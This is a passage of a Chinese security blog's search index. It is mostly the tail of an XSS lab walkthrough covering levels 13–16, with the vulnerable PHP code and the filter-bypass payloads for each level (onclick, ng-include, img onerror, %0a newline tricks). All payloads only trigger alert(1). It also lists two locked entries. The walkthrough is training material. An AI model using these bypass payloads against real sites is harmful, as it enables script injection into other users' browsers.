align=center&gt;没有找到和&quot;</span>.<span class="hljs-built_in">htmlspecialchars</span>($str).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span><span class="hljs-number">.&#x27;</span>&lt;center&gt;<br>&lt;form id=search&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_link&quot;</span>  value=<span class="hljs-string">&quot;&#x27;.&#x27;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_history&quot;</span>  value=<span class="hljs-string">&quot;&#x27;.&#x27;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_sort&quot;</span>  value=<span class="hljs-string">&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_cook&quot;</span>  value=<span class="hljs-string">&quot;&#x27;.$str33.&#x27;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;/form&gt;<br>&lt;/center&gt;<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>cookie注入点</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">user= <span class="hljs-string">&quot; type=&quot;</span>text<span class="hljs-string">&quot; onclick=&quot;</span><span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/c9ce0f435ae54d20b4ea6bb8db3e0f8f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><strong>- Pass-14</strong><br>略<br><strong>- Pass-15</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp">&lt;?<span class="hljs-function">php </span><br><span class="hljs-function"><span class="hljs-title">ini_set</span><span class="hljs-params">(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>)</span></span>;<br>$str = $_GET[<span class="hljs-string">&quot;src&quot;</span>];<br>echo <span class="hljs-string">&#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;</span>.<span class="hljs-built_in">htmlspecialchars</span>($str)<span class="hljs-number">.&#x27;</span><span class="hljs-string">&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;;</span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>注入代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-string">&#x27;level1.php?name=&lt;img src=x οnerrοr=alert(1)&gt;&#x27;</span><br></code></pre></td></tr></table></figure><p>因为这里要访问上面的angular.min.js这个js文件，才能进行包含，虚拟环境里面无法访问那个js，因为需要fanqiang才能访问<br>ng-include：相当于文件包含。用于包含外部的HTML文件，可以作为一个属性，或者一个元素使用</p><p>onerror:<br>οnerrοr&#x3D;handleErr</p><p>function handleErr(msg,url,l)<br>{<br>&#x2F;&#x2F;Handle the error here<br>return true or false<br>}</p><p><strong>- Pass-16</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp">&lt;?<span class="hljs-function">php </span><br><span class="hljs-function"><span class="hljs-title">ini_set</span><span class="hljs-params">(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>)</span></span>;<br>$str = <span class="hljs-built_in">strtolower</span>($_GET[<span class="hljs-string">&quot;keyword&quot;</span>]);<br>$str2=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,$str);<br>$str3=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,$str2);<br>$str4=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,$str3);<br>$str5=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,$str4);<br>echo <span class="hljs-string">&quot;&lt;center&gt;&quot;</span>.$str5.<span class="hljs-string">&quot;&lt;/center&gt;&quot;</span>;<br>?&gt;<br></code></pre></td></tr></table></figure><p>换行符%0a（换行）或者%0d（回车）绕过</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">&lt;img%<span class="hljs-number">0</span>asrc=x%<span class="hljs-number">0</span>aonerror=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;<br><span class="hljs-comment">//src=#就会把后面的都注释掉了</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/45754e08ea02455e99be64da3b0c62bc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>xss靶场练习</tag>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域渗透学习笔记</title>
    <link href="/2022/06/15/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2022/06/15/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="68a431edc9e9a0f64284d862123ff95f6947193dbf3ab78b2630ee3ad63b395a"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>idea</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>博客搭建相关</title>
    <link href="/2022/06/14/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E7%9B%B8%E5%85%B3/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E7%9B%B8%E5%85%B3/"/>
    <url>/2022/06/14/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E7%9B%B8%E5%85%B3/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E7%9B%B8%E5%85%B3/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">  <script id="hbeData" type="hbeData" data-hmacdigest="6a490fad25048ee2a29147ed9488468b2308eeac0f1ff35960f4724b202eb0d2"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>其他</category>
      
    </categories>
    
    
    <tags>
      
      <tag>私密文章</tag>
      
      <tag>博客搭建</tag>
      
      <tag>private</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
